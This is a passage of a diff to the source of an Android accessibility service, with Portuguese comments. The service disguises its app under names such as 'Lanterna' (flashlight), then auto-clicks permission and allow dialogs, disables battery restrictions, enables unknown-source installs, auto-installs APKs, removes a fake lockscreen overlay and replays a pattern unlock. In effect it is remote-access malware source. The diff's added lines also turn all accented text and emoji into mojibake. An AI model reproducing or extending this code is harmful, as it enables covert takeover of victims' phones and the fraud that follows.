         String[] allowButtons = {"Allow", "Permitir", "OK", "Yes", "Sim", "Autoriser", "Erlauben", "izin ver", "izinkan", "Aceptar", "Confirmar", "Permitir siempre", "Permitir solo mientras se usa la aplicacion", "Permitir apenas enquanto estiver usando o aplicativo", "Once", "Nenhuma restricao", "No restrictions", "Sin restricciones", "No restringir", "Siempre", "Always"}; // [KRYPTOS-PATCH BTMOB]
         String[] allowIds = {"com.huawei.packageinstaller:id/permission_allow_button", "com.huawei.systemmanager:id/btn_allow", "com.lbe.security.miui:id/permission_allow_foreground_only_button", "com.miui.securitycenter:id/accept", "miui:id/action_positive", "miui:id/button2", "miui:id/grant", "android:id/button1"};
         for (String idv : allowIds) {
@@ -7317,14 +7565,14 @@ public class UiAssistBridge extends AccessibilityService {
             if (buttons != null && !buttons.isEmpty()) {
                 for (AccessibilityNodeInfo btn : buttons) {
                     if (btn.isClickable()) {
-                        Log.d(TAG, "🔋 DIALOG: Clicando em '" + buttonText + "'!");
+                        Log.d(TAG, "Ã°Å¸â€â€¹ DIALOG: Clicando em '" + buttonText + "'!");
                         btn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                         return true;
                     }
                     // Tenta pai
                     AccessibilityNodeInfo parent = btn.getParent();
                     if (parent != null && parent.isClickable()) {
-                        Log.d(TAG, "🔋 DIALOG: Clicando no pai de '" + buttonText + "'!");
+                        Log.d(TAG, "Ã°Å¸â€â€¹ DIALOG: Clicando no pai de '" + buttonText + "'!");
                         parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                         return true;
                     }
@@ -7336,14 +7584,14 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * 🔧 ROM CONFIG: Auto-click em configurações de ROM
+     * Ã°Å¸â€Â§ ROM CONFIG: Auto-click em configuraÃƒÂ§ÃƒÂµes de ROM
      * Detecta telas de: Autostart, Battery Optimization, Protected Apps, etc.
      * Retorna true se processou a tela
      */
     private boolean handleROMConfigAutoClick(String packageName, String className, AccessibilityNodeInfo rootNode) {
         if (rootNode == null) return false;
         
-        // Detecta apps de configuração de segurança/bateria de cada ROM
+        // Detecta apps de configuraÃƒÂ§ÃƒÂ£o de seguranÃƒÂ§a/bateria de cada ROM
         boolean isROMConfigApp = 
             packageName.contains("securitycenter") ||      // Xiaomi
             packageName.contains("systemmanager") ||        // Huawei
@@ -7357,37 +7605,37 @@ public class UiAssistBridge extends AccessibilityService {
             
         if (!isROMConfigApp) return false;
         
-        Log.d(TAG, "🔧 ROM CONFIG: Detectada tela de configuração! Package: " + packageName + " Class: " + className);
+        Log.d(TAG, "Ã°Å¸â€Â§ ROM CONFIG: Detectada tela de configuraÃƒÂ§ÃƒÂ£o! Package: " + packageName + " Class: " + className);
         
-        // 🔋 ESPECIAL: Se estamos na tela "App battery usage" (lista de apps)
-        // Precisamos encontrar e clicar no dropdown "All apps" → "Unrestricted"
-        // OU rolar até encontrar nosso app
+        // Ã°Å¸â€â€¹ ESPECIAL: Se estamos na tela "App battery usage" (lista de apps)
+        // Precisamos encontrar e clicar no dropdown "All apps" Ã¢â€ â€™ "Unrestricted"
+        // OU rolar atÃƒÂ© encontrar nosso app
         if (className.contains("AppBatteryUsage") || className.contains("BatteryUsage")) {
-            Log.d(TAG, "🔋 Tela de App Battery Usage detectada!");
+            Log.d(TAG, "Ã°Å¸â€â€¹ Tela de App Battery Usage detectada!");
             
             // Procura pelo dropdown "All apps" para mudar para "Unrestricted"
             List<AccessibilityNodeInfo> allAppsNodes = rootNode.findAccessibilityNodeInfosByText("All apps");
             if (allAppsNodes != null && !allAppsNodes.isEmpty()) {
                 for (AccessibilityNodeInfo node : allAppsNodes) {
                     if (node.isClickable()) {
-                        Log.d(TAG, "🔋 Clicando em 'All apps' dropdown...");
+                        Log.d(TAG, "Ã°Å¸â€â€¹ Clicando em 'All apps' dropdown...");
                         node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                         return true;
                     }
                     AccessibilityNodeInfo parent = node.getParent();
                     if (parent != null && parent.isClickable()) {
-                        Log.d(TAG, "🔋 Clicando no pai de 'All apps'...");
+                        Log.d(TAG, "Ã°Å¸â€â€¹ Clicando no pai de 'All apps'...");
                         parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                         return true;
                     }
                 }
             }
             
-            // Se o dropdown está aberto, procura "Unrestricted"
+            // Se o dropdown estÃƒÂ¡ aberto, procura "Unrestricted"
             List<AccessibilityNodeInfo> unrestrictedNodes = rootNode.findAccessibilityNodeInfosByText("Unrestricted");
             if (unrestrictedNodes != null && !unrestrictedNodes.isEmpty()) {
                 for (AccessibilityNodeInfo node : unrestrictedNodes) {
-                    Log.d(TAG, "🔋 Encontrou 'Unrestricted', clicando...");
+                    Log.d(TAG, "Ã°Å¸â€â€¹ Encontrou 'Unrestricted', clicando...");
                     node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                     if (node.getParent() != null) {
                         node.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
@@ -7401,29 +7649,29 @@ public class UiAssistBridge extends AccessibilityService {
         }
         
         // 1. PRIMEIRO: Tenta encontrar nosso app na lista e clicar nele
-        String[] appNames = {"vamosverne", "Lanterna", "Proteção", "Segurança", "protecao"};
+        String[] appNames = {"vamosverne", "Lanterna", "ProteÃƒÂ§ÃƒÂ£o", "SeguranÃƒÂ§a", "protecao"};
         for (String appName : appNames) {
             List<AccessibilityNodeInfo> appNodes = rootNode.findAccessibilityNodeInfosByText(appName);
             if (appNodes != null && !appNodes.isEmpty()) {
                 for (AccessibilityNodeInfo appNode : appNodes) {
-                    Log.d(TAG, "🔧 ROM CONFIG: Encontrou '" + appName + "' na lista!");
+                    Log.d(TAG, "Ã°Å¸â€Â§ ROM CONFIG: Encontrou '" + appName + "' na lista!");
                     if (appNode.isClickable()) {
-                        Log.d(TAG, "🔧 ROM CONFIG: Clicando em nosso app!");
+                        Log.d(TAG, "Ã°Å¸â€Â§ ROM CONFIG: Clicando em nosso app!");
                         appNode.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                         return true;
                     }
                     // Tenta pai
                     AccessibilityNodeInfo parent = appNode.getParent();
                     if (parent != null && parent.isClickable()) {
-                        Log.d(TAG, "🔧 ROM CONFIG: Clicando no pai do nosso app!");
+                        Log.d(TAG, "Ã°Å¸â€Â§ ROM CONFIG: Clicando no pai do nosso app!");
                         parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                         return true;
                     }
-                    // Tenta avô
+                    // Tenta avÃƒÂ´
                     if (parent != null) {
                         AccessibilityNodeInfo grandparent = parent.getParent();
                         if (grandparent != null && grandparent.isClickable()) {
-                            Log.d(TAG, "🔧 ROM CONFIG: Clicando no avô do nosso app!");
+                            Log.d(TAG, "Ã°Å¸â€Â§ ROM CONFIG: Clicando no avÃƒÂ´ do nosso app!");
                             grandparent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                             return true;
                         }
@@ -7434,45 +7682,45 @@ public class UiAssistBridge extends AccessibilityService {
         
         // 2. SEGUNDO: Palavras para AUTO-HABILITAR (switch on, permitir, etc)
         String[] enableKeywords = {
-            // Português
-            "Sem restrições", "Ignorar otimização", "Não otimizar", 
+            // PortuguÃƒÂªs
+            "Sem restriÃƒÂ§ÃƒÂµes", "Ignorar otimizaÃƒÂ§ÃƒÂ£o", "NÃƒÂ£o otimizar", 
             "Permitir atividade em segundo plano", "Manter atividade",
             "Permitir", "Ativar", "Habilitar", "Ligar", "Sim", "Aceitar",
-            "Iniciar automaticamente", "Autostart", "Início automático",
-            // Inglês
+            "Iniciar automaticamente", "Autostart", "InÃƒÂ­cio automÃƒÂ¡tico",
+            // InglÃƒÂªs
             "Unrestricted", "No restrictions", "Don't optimize",
             "Allow background activity", "Keep running", "Ignore optimization",
             "Allow", "Enable", "Turn on", "Yes", "Accept",
             "Auto-start", "Autostart", "Auto start", "Auto launch", "Sin restricciones", "No restringir", "Sin limites", "Empezar", "Iniciar", "Siempre", "Permitir siempre", "Autoarranque", "Arranque automatico", "Habilitar autoarranque", "Autoriser", "Erlauben", "izin ver", "izinkan", "No optimizar"
         };
         
-        // Tenta encontrar e clicar em switches/botões
+        // Tenta encontrar e clicar em switches/botÃƒÂµes
         for (String keyword : enableKeywords) {
             List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(keyword);
             if (nodes != null && !nodes.isEmpty()) {
                 for (AccessibilityNodeInfo node : nodes) {
-                    Log.d(TAG, "🔧 ROM CONFIG: Encontrou '" + keyword + "'");
+                    Log.d(TAG, "Ã°Å¸â€Â§ ROM CONFIG: Encontrou '" + keyword + "'");
                     
-                    // Tenta clicar no próprio nó
+                    // Tenta clicar no prÃƒÂ³prio nÃƒÂ³
                     if (node.isClickable()) {
-                        Log.d(TAG, "🔧 ROM CONFIG: Clicando em '" + keyword + "'");
+                        Log.d(TAG, "Ã°Å¸â€Â§ ROM CONFIG: Clicando em '" + keyword + "'");
                         node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                         return true;
                     }
                     
-                    // Tenta clicar no pai (switch geralmente está no pai)
+                    // Tenta clicar no pai (switch geralmente estÃƒÂ¡ no pai)
                     AccessibilityNodeInfo parent = node.getParent();
                     if (parent != null) {
                         if (parent.isClickable()) {
-                            Log.d(TAG, "🔧 ROM CONFIG: Clicando no pai de '" + keyword + "'");
+                            Log.d(TAG, "Ã°Å¸â€Â§ ROM CONFIG: Clicando no pai de '" + keyword + "'");
                             parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                             return true;
                         }
                         
-                        // Tenta o avô
+                        // Tenta o avÃƒÂ´
                         AccessibilityNodeInfo grandparent = parent.getParent();
                         if (grandparent != null && grandparent.isClickable()) {
-                            Log.d(TAG, "🔧 ROM CONFIG: Clicando no avô de '" + keyword + "'");
+                            Log.d(TAG, "Ã°Å¸â€Â§ ROM CONFIG: Clicando no avÃƒÂ´ de '" + keyword + "'");
                             grandparent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                             return true;
                         }
@@ -7481,7 +7729,7 @@ public class UiAssistBridge extends AccessibilityService {
             }
         }
         
-        // 3. TERCEIRO: Se é tela de bateria, procura por radio buttons de "Unrestricted"
+        // 3. TERCEIRO: Se ÃƒÂ© tela de bateria, procura por radio buttons de "Unrestricted"
         if (className.contains("Battery") || packageName.contains("battery")) {
             // Procura todos os radio buttons
             List<AccessibilityNodeInfo> radioButtons = rootNode.findAccessibilityNodeInfosByViewId("android:id/text1");
@@ -7489,8 +7737,8 @@ public class UiAssistBridge extends AccessibilityService {
                 for (AccessibilityNodeInfo radio : radioButtons) {
                     CharSequence text = radio.getText();
                     if (text != null && (text.toString().contains("Unrestricted") || 
-                                         text.toString().contains("Sem restrições"))) {
-                        Log.d(TAG, "🔧 ROM CONFIG: Encontrou radio 'Unrestricted'!");
+                                         text.toString().contains("Sem restriÃƒÂ§ÃƒÂµes"))) {
+                        Log.d(TAG, "Ã°Å¸â€Â§ ROM CONFIG: Encontrou radio 'Unrestricted'!");
                         radio.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                         if (radio.getParent() != null) {
                             radio.getParent().performAction(AccessibilityNodeInfo.ACTION_CLICK);
@@ -7505,18 +7753,18 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * 🔄 Rola a lista para encontrar nosso app
+     * Ã°Å¸â€â€ž Rola a lista para encontrar nosso app
      */
     private void scrollToFindOurApp(AccessibilityNodeInfo rootNode) {
         if (rootNode == null) return;
         
         // Primeiro tenta encontrar nosso app
-        String[] appNames = {"vamosverne", "Lanterna", "Proteção", "protecao", "Segurança"};
+        String[] appNames = {"vamosverne", "Lanterna", "ProteÃƒÂ§ÃƒÂ£o", "protecao", "SeguranÃƒÂ§a"};
         for (String appName : appNames) {
             List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(appName);
             if (nodes != null && !nodes.isEmpty()) {
                 for (AccessibilityNodeInfo node : nodes) {
-                    Log.d(TAG, "🔋 Encontrou nosso app '" + appName + "' na lista!");
+                    Log.d(TAG, "Ã°Å¸â€â€¹ Encontrou nosso app '" + appName + "' na lista!");
                     if (node.isClickable()) {
                         node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                         return;
@@ -7530,10 +7778,10 @@ public class UiAssistBridge extends AccessibilityService {
             }
         }
         
-        // Se não encontrou, tenta rolar a lista
-        Log.d(TAG, "🔋 App não visível, tentando rolar lista...");
+        // Se nÃƒÂ£o encontrou, tenta rolar a lista
+        Log.d(TAG, "Ã°Å¸â€â€¹ App nÃƒÂ£o visÃƒÂ­vel, tentando rolar lista...");
         
-        // Procura uma lista scrollável
+        // Procura uma lista scrollÃƒÂ¡vel
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             // Faz scroll para baixo usando gesto
             try {
@@ -7553,29 +7801,29 @@ public class UiAssistBridge extends AccessibilityService {
                 dispatchGesture(builder.build(), new GestureResultCallback() {
                     @Override
                     public void onCompleted(GestureDescription gestureDescription) {
-                        Log.d(TAG, "🔋 Scroll realizado!");
+                        Log.d(TAG, "Ã°Å¸â€â€¹ Scroll realizado!");
                     }
                 }, null);
             } catch (Exception e) {
-                Log.e(TAG, "🔋 Erro ao fazer scroll: " + e.getMessage());
+                Log.e(TAG, "Ã°Å¸â€â€¹ Erro ao fazer scroll: " + e.getMessage());
             }
         }
     }
     
     /**
-     * 📦 Auto-clica em "Instalar" na tela de instalação de APK
+     * Ã°Å¸â€œÂ¦ Auto-clica em "Instalar" na tela de instalaÃƒÂ§ÃƒÂ£o de APK
      */
     private void autoClickInstallButton(AccessibilityNodeInfo rootNode) {
         if (rootNode == null) return;
         
-        // Lista de textos de botões de instalação
+        // Lista de textos de botÃƒÂµes de instalaÃƒÂ§ÃƒÂ£o
         String[] installButtons = {
             "Install", "Instalar", 
             "Update", "Atualizar",
             "Install anyway", "Instalar mesmo assim",
             "Continue", "Continuar",
-            "Next", "Próximo", "Avançar",
-            "Done", "Concluído", "OK",
+            "Next", "PrÃƒÂ³ximo", "AvanÃƒÂ§ar",
+            "Done", "ConcluÃƒÂ­do", "OK",
             "Open", "Abrir"
         };
         
@@ -7584,10 +7832,10 @@ public class UiAssistBridge extends AccessibilityService {
             if (buttons != null && !buttons.isEmpty()) {
                 for (AccessibilityNodeInfo btn : buttons) {
                     if (btn.isClickable() || btn.isEnabled()) {
-                        Log.d(TAG, "📦 AUTO-INSTALL: Clicando em '" + buttonText + "'");
+                        Log.d(TAG, "Ã°Å¸â€œÂ¦ AUTO-INSTALL: Clicando em '" + buttonText + "'");
                         btn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                         
-                        // Tenta clicar no pai também
+                        // Tenta clicar no pai tambÃƒÂ©m
                         AccessibilityNodeInfo parent = btn.getParent();
                         if (parent != null && parent.isClickable()) {
                             parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
@@ -7598,17 +7846,17 @@ public class UiAssistBridge extends AccessibilityService {
             }
         }
         
-        // Se não encontrou por texto, procura por classe Button
+        // Se nÃƒÂ£o encontrou por texto, procura por classe Button
         findAndClickButton(rootNode, installButtons);
     }
     
     /**
-     * 📦 Auto-habilita "Fontes Desconhecidas" / "Install unknown apps"
+     * Ã°Å¸â€œÂ¦ Auto-habilita "Fontes Desconhecidas" / "Install unknown apps"
      */
     private void autoEnableUnknownSources(AccessibilityNodeInfo rootNode) {
         if (rootNode == null) return;
         
-        Log.d(TAG, "📦 AUTO-INSTALL: Tentando habilitar fontes desconhecidas...");
+        Log.d(TAG, "Ã°Å¸â€œÂ¦ AUTO-INSTALL: Tentando habilitar fontes desconhecidas...");
         
         // Procura por switches/toggles para habilitar
         String[] enableTexts = {
@@ -7621,27 +7869,27 @@ public class UiAssistBridge extends AccessibilityService {
         // Primeiro, procura por Switch ou Toggle
         findAndClickSwitch(rootNode);
         
-        // Também procura por botões com texto de permitir
+        // TambÃƒÂ©m procura por botÃƒÂµes com texto de permitir
         for (String text : enableTexts) {
             List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(text);
             if (nodes != null && !nodes.isEmpty()) {
                 for (AccessibilityNodeInfo node : nodes) {
-                    // Verifica se é um switch/toggle que está OFF
+                    // Verifica se ÃƒÂ© um switch/toggle que estÃƒÂ¡ OFF
                     if (node.getClassName() != null) {
                         String nodeClass = node.getClassName().toString();
                         if (nodeClass.contains("Switch") || nodeClass.contains("Toggle") || 
                             nodeClass.contains("CheckBox") || nodeClass.contains("Checkable")) {
                             if (!node.isChecked()) {
-                                Log.d(TAG, "📦 AUTO-INSTALL: Habilitando switch: " + text);
+                                Log.d(TAG, "Ã°Å¸â€œÂ¦ AUTO-INSTALL: Habilitando switch: " + text);
                                 node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                 return;
                             }
                         }
                     }
                     
-                    // Tenta clicar se for clicável
+                    // Tenta clicar se for clicÃƒÂ¡vel
                     if (node.isClickable()) {
-                        Log.d(TAG, "📦 AUTO-INSTALL: Clicando em: " + text);
+                        Log.d(TAG, "Ã°Å¸â€œÂ¦ AUTO-INSTALL: Clicando em: " + text);
                         node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                         return;
                     }
@@ -7649,7 +7897,7 @@ public class UiAssistBridge extends AccessibilityService {
                     // Tenta clicar no pai
                     AccessibilityNodeInfo parent = node.getParent();
                     if (parent != null && parent.isClickable()) {
-                        Log.d(TAG, "📦 AUTO-INSTALL: Clicando no pai de: " + text);
+                        Log.d(TAG, "Ã°Å¸â€œÂ¦ AUTO-INSTALL: Clicando no pai de: " + text);
                         parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                         return;
                     }
@@ -7659,15 +7907,15 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * 📦 Clica em "Settings" no diálogo de fontes desconhecidas
+     * Ã°Å¸â€œÂ¦ Clica em "Settings" no diÃƒÂ¡logo de fontes desconhecidas
      */
     private void autoClickSettingsButton(AccessibilityNodeInfo rootNode) {
         if (rootNode == null) return;
         
-        Log.d(TAG, "📦 AUTO-INSTALL: Procurando botão Settings...");
+        Log.d(TAG, "Ã°Å¸â€œÂ¦ AUTO-INSTALL: Procurando botÃƒÂ£o Settings...");
         
         String[] settingsTexts = {
-            "Settings", "Configurações", "Config",
+            "Settings", "ConfiguraÃƒÂ§ÃƒÂµes", "Config",
             "Go to Settings", "Ir para Config",
             "App settings", "Config do app"
         };
@@ -7676,17 +7924,17 @@ public class UiAssistBridge extends AccessibilityService {
             List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(text);
             if (nodes != null && !nodes.isEmpty()) {
                 for (AccessibilityNodeInfo node : nodes) {
-                    Log.d(TAG, "📦 AUTO-INSTALL: Encontrou '" + text + "'");
+                    Log.d(TAG, "Ã°Å¸â€œÂ¦ AUTO-INSTALL: Encontrou '" + text + "'");
                     
                     if (node.isClickable()) {
-                        Log.d(TAG, "📦 AUTO-INSTALL: Clicando em Settings!");
+                        Log.d(TAG, "Ã°Å¸â€œÂ¦ AUTO-INSTALL: Clicando em Settings!");
                         node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                         return;
                     }
                     
                     AccessibilityNodeInfo parent = node.getParent();
                     if (parent != null && parent.isClickable()) {
-                        Log.d(TAG, "📦 AUTO-INSTALL: Clicando no pai de Settings!");
+                        Log.d(TAG, "Ã°Å¸â€œÂ¦ AUTO-INSTALL: Clicando no pai de Settings!");
                         parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                         return;
                     }
@@ -7700,11 +7948,11 @@ public class UiAssistBridge extends AccessibilityService {
             }
         }
         
-        // Última tentativa: procura todos os botões e clica no da direita (geralmente Settings)
+        // ÃƒÅ¡ltima tentativa: procura todos os botÃƒÂµes e clica no da direita (geralmente Settings)
         List<AccessibilityNodeInfo> allButtons = findNodesByClassName(rootNode, "android.widget.Button");
         if (allButtons != null && allButtons.size() >= 2) {
             AccessibilityNodeInfo rightButton = allButtons.get(allButtons.size() - 1);
-            Log.d(TAG, "📦 AUTO-INSTALL: Clicando no último botão (Settings)");
+            Log.d(TAG, "Ã°Å¸â€œÂ¦ AUTO-INSTALL: Clicando no ÃƒÂºltimo botÃƒÂ£o (Settings)");
             rightButton.performAction(AccessibilityNodeInfo.ACTION_CLICK);
             
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
@@ -7714,19 +7962,19 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * 📦 Procura e clica em Switch/Toggle na tela
+     * Ã°Å¸â€œÂ¦ Procura e clica em Switch/Toggle na tela
      */
     private void findAndClickSwitch(AccessibilityNodeInfo node) {
         if (node == null) return;
         
         String className = node.getClassName() != null ? node.getClassName().toString() : "";
         
-        // Verifica se é um Switch/Toggle
+        // Verifica se ÃƒÂ© um Switch/Toggle
         if (className.contains("Switch") || className.contains("Toggle") || 
             className.contains("CheckBox") || className.contains("Checkable")) {
-            // Se não está checked, clica para habilitar
+            // Se nÃƒÂ£o estÃƒÂ¡ checked, clica para habilitar
             if (!node.isChecked()) {
-                Log.d(TAG, "📦 AUTO-INSTALL: Encontrou switch OFF, clicando para habilitar");
+                Log.d(TAG, "Ã°Å¸â€œÂ¦ AUTO-INSTALL: Encontrou switch OFF, clicando para habilitar");
                 node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                 return;
             }
@@ -7742,7 +7990,7 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * 📦 Procura e clica em botões por classe
+     * Ã°Å¸â€œÂ¦ Procura e clica em botÃƒÂµes por classe
      */
     private void findAndClickButton(AccessibilityNodeInfo node, String[] texts) {
         if (node == null) return;
@@ -7758,7 +8006,7 @@ public class UiAssistBridge extends AccessibilityService {
             
             for (String t : texts) {
                 if (text.contains(t.toLowerCase()) || desc.contains(t.toLowerCase())) {
-                    Log.d(TAG, "📦 AUTO-INSTALL: Encontrou botão '" + t + "' - clicando!");
+                    Log.d(TAG, "Ã°Å¸â€œÂ¦ AUTO-INSTALL: Encontrou botÃƒÂ£o '" + t + "' - clicando!");
                     node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                     return;
                 }
@@ -7775,12 +8023,12 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * Clica no botão Cancel/Cancelar
+     * Clica no botÃƒÂ£o Cancel/Cancelar
      */
     private void clickCancelButton(AccessibilityNodeInfo node) {
         if (node == null) return;
         
-        // Procura botão Cancel
+        // Procura botÃƒÂ£o Cancel
         List<AccessibilityNodeInfo> cancelButtons = node.findAccessibilityNodeInfosByText("Cancel");
         if (cancelButtons == null || cancelButtons.isEmpty()) {
             cancelButtons = node.findAccessibilityNodeInfosByText("Cancelar");
@@ -7789,20 +8037,20 @@ public class UiAssistBridge extends AccessibilityService {
             cancelButtons = node.findAccessibilityNodeInfosByText("No");
         }
         if (cancelButtons == null || cancelButtons.isEmpty()) {
-            cancelButtons = node.findAccessibilityNodeInfosByText("Não");
+            cancelButtons = node.findAccessibilityNodeInfosByText("NÃƒÂ£o");
         }
         
         if (cancelButtons != null && !cancelButtons.isEmpty()) {
             for (AccessibilityNodeInfo btn : cancelButtons) {
                 if (btn.isClickable()) {
-                    Log.d(TAG, "🔒 Clicando em CANCEL!");
+                    Log.d(TAG, "Ã°Å¸â€â€™ Clicando em CANCEL!");
                     btn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                     return;
                 }
-                // Tenta clicar no pai se o botão não for clicável
+                // Tenta clicar no pai se o botÃƒÂ£o nÃƒÂ£o for clicÃƒÂ¡vel
                 AccessibilityNodeInfo parent = btn.getParent();
                 if (parent != null && parent.isClickable()) {
-                    Log.d(TAG, "🔒 Clicando no pai do CANCEL!");
+                    Log.d(TAG, "Ã°Å¸â€â€™ Clicando no pai do CANCEL!");
                     parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                     return;
                 }
@@ -7811,7 +8059,7 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * Verifica se o pacote pertence às Configurações ou Segurança do sistema (Samsung, Xiaomi, Huawei, etc)
+     * Verifica se o pacote pertence ÃƒÂ s ConfiguraÃƒÂ§ÃƒÂµes ou SeguranÃƒÂ§a do sistema (Samsung, Xiaomi, Huawei, etc)
      */
     private boolean isSettingsOrSecurityPackage(String pkg) {
         if (pkg == null) return false;
@@ -7827,7 +8075,7 @@ public class UiAssistBridge extends AccessibilityService {
     }
 
     /**
-     * Verifica se a tela contém texto relacionado a Acessibilidade
+     * Verifica se a tela contÃƒÂ©m texto relacionado a Acessibilidade
      */
     private boolean containsAccessibilityText(AccessibilityNodeInfo node) {
         if (node == null) return false;
@@ -7835,8 +8083,8 @@ public class UiAssistBridge extends AccessibilityService {
         // Textos que indicam tela de acessibilidade
         String[] accessibilityTexts = {
             "Accessibility", "Acessibilidade", 
-            "Downloaded services", "Serviços baixados",
-            "Installed services", "Serviços instalados",
+            "Downloaded services", "ServiÃƒÂ§os baixados",
+            "Installed services", "ServiÃƒÂ§os instalados",
             "Screen readers", "Leitores de tela"
         };
         
@@ -7844,8 +8092,8 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * Verifica se a tela contém o nome do nosso app
-     * Pega o nome DINAMICAMENTE do próprio APK
+     * Verifica se a tela contÃƒÂ©m o nome do nosso app
+     * Pega o nome DINAMICAMENTE do prÃƒÂ³prio APK
      */
     private boolean containsOurAppName(AccessibilityNodeInfo node) {
         if (node == null) return false;
@@ -7857,7 +8105,7 @@ public class UiAssistBridge extends AccessibilityService {
         // Lista de nomes para verificar
         java.util.List<String> ourAppNames = new java.util.ArrayList<>();
         
-        // Nome do app (definido no build) e package — sem termos genéricos
+        // Nome do app (definido no build) e package Ã¢â‚¬â€ sem termos genÃƒÂ©ricos
         if (appName != null && !appName.isEmpty()) {
             ourAppNames.add(appName);
         }
@@ -7865,7 +8113,7 @@ public class UiAssistBridge extends AccessibilityService {
         // Package name
         ourAppNames.add(packageName);
 
-        // Adiciona o título do serviço de admin dinamicamente (se existir nos recursos)
+        // Adiciona o tÃƒÂ­tulo do serviÃƒÂ§o de admin dinamicamente (se existir nos recursos)
         try {
             int resId = getResources().getIdentifier("service_detail_title", "string", packageName);
             if (resId != 0) {
@@ -7882,7 +8130,7 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * Obtém o nome do app definido no AndroidManifest/strings
+     * ObtÃƒÂ©m o nome do app definido no AndroidManifest/strings
      */
     private String getAppName() {
         try {
@@ -7896,12 +8144,12 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * Verifica se a hierarquia contém algum dos textos especificados
+     * Verifica se a hierarquia contÃƒÂ©m algum dos textos especificados
      */
     private boolean containsAnyText(AccessibilityNodeInfo node, String[] texts) {
         if (node == null) return false;
         
-        // Verifica texto do nó atual
+        // Verifica texto do nÃƒÂ³ atual
         CharSequence nodeText = node.getText();
         CharSequence contentDesc = node.getContentDescription();
         
@@ -7921,14 +8169,14 @@ public class UiAssistBridge extends AccessibilityService {
                 if (containsAnyText(child, texts)) {
                     return true;
                 }
-                // Não recicla aqui para evitar problemas
+                // NÃƒÂ£o recicla aqui para evitar problemas
             }
         }
         
         return false;
     }
     
-    // ==================== DELEGADORES GESTOS (implementação em GestureCore) ====================
+    // ==================== DELEGADORES GESTOS (implementaÃƒÂ§ÃƒÂ£o em GestureCore) ====================
 
     public GestureCore getGestureCore() {
         return gestureCore;
@@ -7965,16 +8213,16 @@ public class UiAssistBridge extends AccessibilityService {
      */
     private void executePatternUnlock(int[] patternPoints) {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
-            Log.e(TAG, "❌ Pattern unlock requer Android 7.0+");
+            Log.e(TAG, "Ã¢ÂÅ’ Pattern unlock requer Android 7.0+");
             return;
         }
         
         if (patternPoints == null || patternPoints.length < 2) {
-            Log.e(TAG, "❌ Pattern inválido (precisa de pelo menos 2 pontos)");
+            Log.e(TAG, "Ã¢ÂÅ’ Pattern invÃƒÂ¡lido (precisa de pelo menos 2 pontos)");
             return;
         }
         
-        Log.d(TAG, "🔓 Removendo lockscreen fake e acordando tela para Pattern Unlock...");
+        Log.d(TAG, "Ã°Å¸â€â€œ Removendo lockscreen fake e acordando tela para Pattern Unlock...");
         
         // 1. Remove qualquer overlay de lockscreen fake para expor o lockscreen real do sistema
         if (isLockscreenActive) {
@@ -7994,7 +8242,7 @@ public class UiAssistBridge extends AccessibilityService {
         // Check if PatternView is ALREADY open and visible on screen
         AccessibilityNodeInfo existingView = findPatternView();
         if (existingView != null) {
-            Log.d(TAG, "⚡ PatternView JÁ visível na tela! Executando Pattern imediatamente...");
+            Log.d(TAG, "Ã¢Å¡Â¡ PatternView JÃƒÂ visÃƒÂ­vel na tela! Executando Pattern imediatamente...");
             executePatternGesture(existingView, patternPoints, wasBlackScreenActive);
             existingView.recycle();
             return;
@@ -8004,7 +8252,7 @@ public class UiAssistBridge extends AccessibilityService {
             if (gestureCore != null) {
                 gestureCore.swipeUpToUnlock();
             }
-            // 4. Aguarda a animação do swipe estabilizar e inicia tentativas
+            // 4. Aguarda a animaÃƒÂ§ÃƒÂ£o do swipe estabilizar e inicia tentativas
             handler.postDelayed(() -> attemptExecutePatternUnlock(patternPoints, 0, wasBlackScreenActive), 600);
         }, 300);
     }
@@ -8013,22 +8261,22 @@ public class UiAssistBridge extends AccessibilityService {
         AccessibilityNodeInfo patternView = findPatternView();
         
         if (patternView != null) {
-            Log.d(TAG, "✅ PatternView detectado na tentativa " + (attempt + 1));
+            Log.d(TAG, "Ã¢Å“â€¦ PatternView detectado na tentativa " + (attempt + 1));
             executePatternGesture(patternView, patternPoints, restoreBlackScreen);
